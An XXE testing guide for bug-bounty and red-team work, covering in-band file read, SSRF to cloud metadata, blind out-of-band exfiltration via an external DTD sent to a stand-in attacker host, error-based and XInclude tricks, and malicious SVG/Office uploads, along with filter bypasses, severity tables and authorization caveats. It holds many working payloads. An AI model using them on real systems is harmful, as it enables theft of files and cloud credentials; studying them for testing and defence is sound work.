# XXE (XML External Entity) — Complete In-Depth Testing Guide (Expert / Bug-Bounty & Red-Team Edition)

**Author:** x8bitranjit
**Scope:** Any feature that **parses XML** (or an XML-derived format) from user input — raw XML request bodies, SOAP,
REST endpoints that accept `application/xml`/`text/xml`, **file uploads** (SVG, DOCX/XLSX/PPTX = OOXML, ODT, PDF, RSS/
Atom, SVG, `.xml` config, GPX/KML, plists), SAML responses, XML-RPC, sitemaps, RSS importers, SVG→PNG converters, and
any sink calling an XML parser (`libxml2`, `DocumentBuilder`/`SAXParser`, `XmlDocument`/`XmlReader`, `lxml`/`etree`,
`Nokogiri`, `expat`, `xmldom`).
**Backends:** parser-dependent — **Java, PHP, .NET, Python, Ruby, Node, Go** specifics all covered. Kali/WSL for the OOB DTD server & tooling.
**Companion files in this folder:**
- `XXE_ARSENAL.md` — copy-paste payloads for every sub-type, per-parser, per-protocol, + WAF/filter bypasses
- `XXE_CHECKLIST.md` — the per-sink testing checklist
- `XXE_REPORT_TEMPLATE.md` — the report skeleton that gets paid
- `poc/` — runnable OOB DTD/exfil server, an XXE probe, and Office/SVG malicious-doc builders
- `XXE_Zero_to_Expert.md` — the 100-question study + field reference Q&A

> ⚖️ **Authorized testing only.** In-scope targets, benign markers, **read a non-sensitive file first** (`/etc/hostname`)
> to prove the primitive, bound your reads (don't exfil the whole filesystem or real secrets you don't need), no
> entity-expansion **DoS** against production, delete any uploaded artifacts, and clean up your OOB listener. XXE reaches
> secrets and internal networks fast — prove the capability, not the maximum damage.

> **Read the basics first, then go deep here.** Fundamentals: **PortSwigger Web Security Academy — XXE injection**
> (+ its 9 labs), **HackTricks — XXE**, **PayloadsAllTheThings — XXE Injection**, **PentesterLab — XML Attacks /
> XXE badges**, OWASP WSTG (Testing for XML Injection) + the **XXE Prevention Cheat Sheet**. This guide assumes you know
> what a DTD and an entity are.

---

## 0. Read this first — why XXE pays (impact intro)
XXE turns "the app parses my XML" into **read arbitrary server files, reach the internal network, steal cloud
credentials, and sometimes get RCE** — with a single crafted document. It is consistently **High–Critical** because
the payoff is direct:
- **Arbitrary file read** → application **source code** (via `php://filter` base64), config files with **DB creds/API
  keys/secrets**, `/etc/passwd`, SSH keys, `web.config`/`.env`, tokens. Source + secrets is frequently a full compromise.
- **SSRF** → hit internal services and, on cloud, **`169.254.169.254`** metadata → **temporary IAM credentials** →
  account/infrastructure takeover. XXE is one of the cleanest paths to cloud creds.
- **Blind / OOB exfiltration** → even when nothing is reflected, pull file contents to your server via an external DTD.
- **RCE** → PHP `expect://`, upload chains, or specific parser features; occasionally direct.
- **DoS** → billion-laughs entity expansion (usually *out of scope* / don't fire it).

**Lead your report with impact:** "read `/etc/passwd` / app source / `aws` creds", "reached the cloud metadata
endpoint and retrieved IAM credentials", "exfiltrated `<file>` out-of-band". Not "the parser resolves external entities."

**The core mechanism (know it cold):** an XML **DOCTYPE** can declare an **external entity** that the parser
*dereferences* when the document is processed:
```xml
<?xml version="1.0"?>
<!DOCTYPE r [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<r>&xxe;</r>
```
If `&xxe;` value comes back (reflected), you have **in-band file read**. If not, you go **blind/OOB** (§8) or
**error-based** (§9). Everything else is a variation on getting that dereference to happen and getting the data out.

---

## Master Testing Sequence (the order to actually work in)
1. **Find XML sinks** (§1) — every place XML (or SVG/DOCX/SOAP/SAML/RSS) is accepted or parsed.
2. **Detect parsing & entity support** (§2) — does the parser expand entities at all? (internal-entity test first.)
3. **In-band file read** (§3) — if the entity value is reflected, read a benign file.
4. **SSRF** (§4) — point the entity at internal/metadata URLs.
5. **Blind → OOB** (§8) — no reflection? external-DTD out-of-band exfiltration (parameter entities).
6. **Error-based** (§9) — OOB blocked? force the file into a parser error message (local or remote DTD).
7. **XInclude** (§10) — can't control the DOCTYPE? inject into an XML *data* node.
8. **File-upload XXE** (§11) — SVG / OOXML (DOCX/XLSX/PPTX) / PDF / config.
9. **Content-type switch** (§12) — send XML to a JSON/other endpoint.
10. **Escalate** (§13) — source via `php://filter`, metadata→creds, `expect://`→RCE, local-DTD reuse.
11. **Bypass filters** (§14) → **validate + severity + report** (§16–§18).

---

# PART I — FIND & DETECT

## 1. Where XML gets parsed (find the sinks)
XXE hides anywhere XML is consumed. Hunt for:
- **Raw XML / SOAP bodies:** `Content-Type: application/xml`, `text/xml`, `application/soap+xml`. SOAP APIs are a prime target.
- **REST endpoints that *also* accept XML** even though the UI uses JSON (try the content-type switch, §12).
- **File uploads** that are XML under the hood: **SVG** (image upload, avatars, logos), **DOCX/XLSX/PPTX** (Office =
  zipped XML), **ODT/ODS**, **PDF** (some), **RSS/Atom** feed import, **SVG→PNG/thumbnail** converters, **XML config**
  import, **GPX/KML** (maps), **plist**, **SAML** metadata, **DMARC/XML reports**.
- **XML-driven features:** sitemap/`robots` importers, RSS readers, SSO/**SAML** assertions, XML-RPC (`/xmlrpc.php`),
  SOAP WSDL endpoints, e-invoicing (UBL/XML), SVG sanitizers, document/report generators.
- **Grep source/JS** for parser calls (see Scope) and `DOCTYPE`/`ENTITY` handling.

## 2. Detect XML parsing & entity support (before firing real payloads)
Confirm the app (a) parses your XML and (b) resolves entities — cheaply and safely.

**Step 1 — is it parsed?** Send valid XML and break it (unclosed tag) → a parse **error** vs a normal response tells
you XML is being processed.

**Step 2 — does it expand INTERNAL entities?** (No external fetch — safe, benign.)
```xml
<?xml version="1.0"?>
<!DOCTYPE r [ <!ENTITY test "x8bit-marker"> ]>
<r>&test;</r>
```
If `x8bit-marker` comes back in the response, **entities are expanded and reflected** → go in-band (§3). If it errors on
the DOCTYPE, note the parser's stance (may be hardened, or DOCTYPE filtered → XInclude §10). If parsed but the value
isn't reflected, you're **blind** → OOB (§8).

**Step 3 — is external fetch allowed?** Only now try a `SYSTEM` external entity (a benign local file or your OOB host).

> **Observability classes** (decide your path): **in-band** (entity value reflected → §3), **blind/OOB** (no reflection,
> external fetch works → §8), **error-based** (no OOB, but errors leak content → §9), **fully blind** (nothing — try
> XInclude, uploads, and timing/OOB DNS).

---

# PART II — EXPLOIT (every sub-type)

## 3. In-band XXE — arbitrary file read (the classic)
The entity value is reflected in the response → read files directly:
```xml
<?xml version="1.0"?>
<!DOCTYPE r [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<r>&xxe;</r>
```
Place `&xxe;` in a **data field the response echoes** (e.g. a `<productId>`/`<search>` value the app reflects). Read
benign first (`file:///etc/hostname`), then escalate to impactful files (§13). **Windows:** `file:///c:/windows/win.ini`,
`file:///c:/inetpub/wwwroot/web.config`.

**Gotcha — files with XML metacharacters (`<`, `&`) break the parse.** Multi-line files like `/etc/passwd` are fine;
source code / files containing `<`/`&` will throw. Use **`php://filter` base64** (§13.1) or **CDATA wrapping via
parameter entities** (arsenal) to read those.

## 4. XXE → SSRF (reach the internal network & cloud metadata)
Swap `file://` for `http://` — the parser fetches the URL server-side:
```xml
<!DOCTYPE r [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/"> ]>
<r>&xxe;</r>
```
- **Cloud metadata:** AWS `http://169.254.169.254/latest/meta-data/…` (+ IMDSv2 caveat — see SSRF kit), GCP
  `http://metadata.google.internal/computeMetadata/v1/…` (needs a header — often not settable via XXE, note it),
  Azure/DO/Alibaba equivalents. Retrieving **IAM creds** = Critical.
- **Internal services:** `http://127.0.0.1:PORT/`, internal hostnames, admin panels, `http://localhost:8080/`.
- **Port scan / host discovery** via response/timing differences.
> Full SSRF technique, IP-encoding bypasses, IMDSv2, gopher/RCE → **`../SSRF/`**. XXE is just the delivery; the SSRF kit is the escalation.

## 8. Blind XXE — out-of-band (OOB) exfiltration ★ the money technique
No reflection? Use **parameter entities (`%`)** and an **external DTD** on your server to (a) read a file and (b) send
it to you inside a URL.

**On the target** (this is what you submit):
```xml
<?xml version="1.0"?>
<!DOCTYPE r [ <!ENTITY % ext SYSTEM "http://YOUR-OOB-HOST/evil.dtd"> %ext; ]>
<r>trigger</r>
```
**`evil.dtd` on YOUR server:**
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://YOUR-OOB-HOST/?x=%file;'>">
%eval;
%exfil;
```
The target fetches your DTD, reads the file into `%file`, builds an `%exfil` entity whose URL contains the file, and
requests it from your server → **the file lands in your access log**. Use **Burp Collaborator / Interactsh** or the
kit's `poc/oob_server.py` to catch it. `&#x25;` is `%` (needed to declare a param-entity *inside* another entity).
> Parameter entities are **required** for external-DTD tricks and work even when general (`&`) entities in the internal
> subset are restricted. This is the standard blind-XXE workhorse.

## 9. Error-based XXE (OOB egress blocked, but errors are verbose)
If the box can't make outbound connections but the parser **echoes errors**, force the file's contents into an error
message. Use an external (or reusable **local**, §13.3) DTD:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; err SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%err;
```
The parser tries to open `file:///nonexistent/<contents-of-/etc/passwd>` and **prints the failed path — including the
file contents — in the error**. Great when there's **no outbound** but stack traces are shown.

## 10. XInclude — when you can't control the DOCTYPE
Sometimes the app **wraps your input inside its own XML** (you only control a sub-value, not the whole document, so you
can't add a DOCTYPE). Use **XInclude** to pull a file into that node:
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```
Inject just the `<foo>…</foo>` into the parameter the server embeds. `parse="text"` reads raw file text; combine with
`php://filter` (`href="php://filter/convert.base64-encode/resource=…"`) for source/binaries. **Key insight:** XInclude
needs no DOCTYPE, so it beats "DOCTYPE is filtered" defenses.

## 11. File-upload XXE (image/document uploads are XML)
Uploads are one of the **best** XXE surfaces because the app parses the file server-side (thumbnailing, text
extraction, conversion).
- **SVG** (avatar/logo/image upload, SVG→PNG): SVG *is* XML — embed a DOCTYPE:
  ```xml
  <?xml version="1.0"?>
  <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
  <svg xmlns="http://www.w3.org/2000/svg"><text x="10" y="20">&xxe;</text></svg>
  ```
  Then **view the rendered/converted image** or its text → the file leaks. (See also `../FileUpload/` SVG/XXE payloads.)
- **OOXML — DOCX / XLSX / PPTX** (Office files are ZIPs of XML): unzip, inject a DOCTYPE/parameter-entity into a parsed
  part (e.g. `word/document.xml`, `[Content_Types].xml`, `xl/workbook.xml`), re-zip, upload to a resume/import/preview
  feature. Blind-OOB works well here. Use `poc/make_ooxml_xxe.py`.
- **PDF / GPX / KML / plist / RSS / SAML metadata** — same idea wherever the format is XML-backed.

## 12. Content-type switching (JSON endpoint → XML → XXE)
A REST endpoint that expects JSON may parse **XML if you change the content type** — some frameworks pick the parser
by `Content-Type`:
```
POST /api/thing            Content-Type: application/xml
<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>
```
Flip `application/json` → `application/xml` (or `text/xml`) and resend the equivalent XML. A classic, often-missed win
on "JSON-only" APIs.

---

# PART III — ESCALATE TO IMPACT

## 13. "You found X → now do Y" (turn a dereference into a paid finding)
### 13.1 Read source & files with XML metacharacters → `php://filter` (PHP)
`file://` chokes on files containing `<`/`&`. **Base64-encode** them through the PHP filter wrapper so the content is
safe to embed and you get the raw source:
```xml
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/config.php">
```
Decode the base64 from the response → **application source** (→ DB creds, secret keys, more bugs). This alone often
escalates XXE to Critical.

### 13.2 SSRF → cloud metadata → credentials → infra
Point the entity/param at `169.254.169.254` (AWS) etc., pull **IAM security-credentials**, use them (`aws sts
get-caller-identity` to prove, then stop) → account/infra takeover. Chain via **`../SSRF/`** (IMDSv2, encodings, gopher).

### 13.3 No outbound? reuse a LOCAL DTD (error-based without your server)
When external DTD fetch is blocked, **repurpose a DTD already on the box** (e.g. GNOME `/usr/share/yelp/dtd/docbookx.dtd`,
or distro/Java DTDs) by redefining one of its parameter entities to trigger error-based exfil (§9). Enumerate a known
local DTD, override its entity, and leak via the error path — no attacker server needed.

### 13.4 RCE
- **PHP with `expect` ext:** `<!ENTITY xxe SYSTEM "expect://id">` → command execution (rare but game-over).
- **Upload chains:** XXE that writes/creates via parser features, or combine with a file-write/`jar:` (Java) primitive.
- **`jar:` (Java):** `jar:http://attacker/evil.jar!/x` can fetch+extract → in some flows leads to write/RCE.
Treat any RCE path as Critical; prove with a benign marker (`id`/`whoami`) and stop.

### 13.5 DoS (know it, usually don't fire it)
**Billion laughs** (nested entity expansion) or **quadratic blowup** can exhaust memory/CPU. Most programs **forbid
DoS** — mention the parser is expansion-vulnerable, do **not** run it against production.

## 14. Parser/language specifics (why a payload works or doesn't)
| Stack | Notes / what to try |
|---|---|
| **Java** (`DocumentBuilder`, SAXParser, older defaults) | Historically XXE-prone; supports `http`,`file`,`ftp`,`jar:`,`netdoc:`. FTP-based OOB works when HTTP is filtered. No `php://`. |
| **PHP** (`libxml`) | `libxml_disable_entity_loader(true)` disables it (PHP≥8 default-safe), but many apps re-enable/old versions. **`php://filter`** base64 = source read; **`expect://`** = RCE if ext present. |
| **.NET** (`XmlDocument`/`XmlReader`) | Old `XmlResolver` resolves externals; `<=4.5.1` often vulnerable by default. `file://`,`http://`. |
| **Python** (`lxml`, `xml.etree`, `xml.sax`) | `lxml` disables network entity access by default in recent versions but **local file** + XInclude may still work; `xml.sax`/older `etree` can be vulnerable. `defusedxml` is the fix. |
| **Ruby** (`Nokogiri`) | Needs `NOENT`/`DTDLOAD` flags to be vulnerable; check if the app set them. |
| **Node** (`libxmljs`, `xmldom`) | `libxmljs` with `noent:true` is vulnerable; many pure-JS parsers ignore DOCTYPE (test to confirm). |
| **Go** (`encoding/xml`) | Does **not** resolve external entities by default — usually XXE-safe; look elsewhere. |

## 15. WAF / filter bypasses (when the obvious payload is blocked)
- **DOCTYPE/ENTITY filtered:** use **XInclude** (§10, no DOCTYPE needed) or **content-type switch** (§12).
- **Encoding:** submit the XML as **UTF-16** (or add a UTF-16/UTF-7 BOM) so a byte-level WAF signature for
  `<!DOCTYPE`/`<!ENTITY` misses it, while the parser still reads it. Also try `<!DOCTYPE`→ mixed case is invalid, but
  whitespace/newline variations inside the DTD, and **nested/parameter entities** to break signatures.
- **`SYSTEM` blocked:** try **`PUBLIC`** (`<!ENTITY xxe PUBLIC "-//x//x" "file:///etc/passwd">`).
- **Protocol filtered:** swap `file://`↔`php://filter`↔`http://`↔`ftp://`↔`jar:`↔`netdoc:`; use FTP-OOB on Java.
- **Outbound blocked:** go **error-based** (§9) + **local-DTD reuse** (§13.3).
- **Reflection stripped but errors shown:** error-based. **Nothing shown at all:** OOB **DNS** (parameter entity to a
  unique subdomain via Interactsh) confirms blind XXE even when HTTP egress is filtered.

---

# PART IV — VALIDITY, SEVERITY & REPORTING

## 16. False-positive auto-reject (don't submit these as-is)
| Looks like XXE | Why it's NOT (yet) | Make it real |
|---|---|---|
| Your **internal** entity (`&test;`) reflected | Proves parsing, **not** external fetch | Read an actual **file** (`/etc/hostname`) or hit your **OOB** host |
| A parse **error** on `<!DOCTYPE` | Could be a hardened/rejecting parser | Confirm with an OOB DNS/HTTP hit or XInclude before claiming |
| OOB **DNS** hit but no HTTP / no data | Confirms blind XXE exists (report as blind) | Escalate to file read (OOB HTTP exfil / error-based) for High |
| "It fetched my URL" (SSRF only) | Real, but scope it | Show **metadata/creds** or **file read** for High–Critical |
| Billion-laughs "crash" on a test box | DoS, usually out of scope | Don't fire on prod; report the primitive only if in scope |
| SVG shows nothing after upload | Maybe not parsed / entity stripped | Try OOB, a converted/thumbnail view, or OOXML instead |

**Golden proof:** a **real file's contents** in the response (or your OOB log), or **cloud creds / metadata** retrieved.
Reflection of an internal entity is a *lead*, not a finding.

## 17. Severity calibration (CVSS + CWE)
```
XXE → arbitrary file read of SECRETS/source (creds, keys, web.config, .env)   Critical–High   CWE-611
XXE → SSRF → cloud metadata → IAM credentials                                  Critical        CWE-611(+918)
XXE → RCE (expect:// / jar / upload chain)                                     Critical        CWE-611(+94)
XXE → OOB exfiltration of arbitrary local files (blind)                        High             CWE-611
XXE → SSRF to internal services (no creds yet)                                 High–Medium      CWE-611/918
XXE → read of a non-sensitive file only / blind DNS-only                       Medium           CWE-611
XXE → entity-expansion DoS (if in scope)                                       Medium–Low       CWE-776
```
Base ≈ `AV:N/AC:L/PR:?/UI:?/S:?/C:H/I:?/A:?`. Raise `S:C` for SSRF into other systems; set `PR`/`UI` by how the XML is
reached (unauth upload = worse). Lead with the **file/creds you actually retrieved**.

## 18. Reporting (see `XXE_REPORT_TEMPLATE.md`)
Include: the exact **request** (endpoint, content-type, the XML/DTD, and — for OOB — your `evil.dtd` and the received
callback), the **retrieved content** (a benign file, or redacted secret proving read; the OOB access-log line), the
observability class (in-band/blind/error), parser/stack if known, CWE-611 + CVSS, and **impact in business terms**
("unauthenticated file read of application source & DB credentials via resume upload"). Redact real secrets. State the
SAFE-PoC discipline.

## 19. SAFE-PoC discipline (XXE reaches secrets & internal nets — be careful)
- **Prove with a benign file first** — `/etc/hostname` / `win.ini` — before touching anything sensitive; read the
  **minimum** needed to demonstrate impact (one config line, not the whole filesystem; don't hoard real secrets/keys).
- **SSRF/metadata:** retrieve creds only to **prove** it (`sts get-caller-identity`), then **stop** — no using them to pivot beyond PoC without explicit authorization.
- **No DoS** (billion-laughs/expansion) on production — mention the primitive, don't fire it.
- **Uploads:** use your own account, mark files benignly, and **delete** uploaded artifacts after.
- **OOB:** use a listener you control (Collaborator/Interactsh/`poc/oob_server.py`); tear it down after; don't leave a public exfil endpoint up.

---

## 20. Real-world attacks & CVEs (this class ships constantly)
- **Facebook** — XXE via an OpenID/DOCX-style flow (classic high-payout OOB read).
- **Google, Uber, Microsoft, Shopify, Magento, WordPress, Jira/Confluence, GitLab, Jenkins, SharePoint, DoD** — all
  have public XXE reports/CVEs (uploads, SAML, XML-RPC, SOAP, config import).
- **SAML XXE** — SSO assertion parsers reading external entities (auth-adjacent, high impact).
- **DOCX/resume-upload XXE** — the archetypal "upload a Word doc → OOB file read" bounty.
- **Apache Struts / Spring OXM / .NET / countless libraries** — recurring parser-default XXE CVEs.
- The pattern never dies because **new formats keep being XML** and parsers ship insecure defaults.

## 21. Appendix — canonical references

**Core methodology**
- **PortSwigger Web Security Academy — XXE injection** (topic + 9 labs: file read, SSRF, blind OOB, error-based, XInclude,
  SVG upload, content-type, local-DTD, repurposing): https://portswigger.net/web-security/xxe
- **HackTricks — XXE / XEE**; **PayloadsAllTheThings — XXE Injection**; **PentesterLab — XML Attacks / XXE**.
- **OWASP** — WSTG "Testing for XML Injection"; **XXE Prevention Cheat Sheet**; Top-10 (was A4:2017).

**Class-defining research**
- **Timothy Morgan & Omar Al Ibrahim** — "XML Schema, DTD, and Entity Attacks: A Compendium of Known Techniques" (VSR, 2014)
  — the canonical XXE paper (parameter-entity OOB, error-based, and local-DTD reuse techniques).
- **PortSwigger Research** — blind XXE via external DTDs + parameter entities, and error-based / local-DTD exfiltration.

**Standards**
- **CWE-611** (Improper Restriction of XML External Entity Reference) · **CWE-776** (entity expansion / billion laughs) ·
  **CWE-918** (SSRF chain) · **CVSS 3.1** calculator: https://www.first.org/cvss/calculator/3.1

**Companion kits**
- `../SSRF/` (metadata/RCE escalation) · `../FileUpload/` (SVG/OOXML XXE payloads) · `../LFI/` (php://filter source read) ·
  `../Recon/` · `../../API/REST/` (content-type switch) · `../OAuth/` (**SAML XXE** — SSO assertion parsers reading external entities).

---

> **Bottom line:** find every place XML is parsed (bodies, SOAP, **uploads**, SAML), confirm entity expansion with a
> benign internal entity, then take the highest path available: **in-band file read** → **`php://filter` source** →
> **SSRF to cloud metadata → IAM creds** → **RCE**; and when nothing reflects, go **blind OOB** (external DTD +
> parameter entities) or **error-based** (local-DTD reuse). Beat filters with **XInclude / content-type switch /
> UTF-16 / PUBLIC / protocol-swap**. Prove impact on a **benign** file, escalate to the secret/creds, report CWE-611
> impact-first. Authorized targets only — read the minimum, and clean up your OOB.
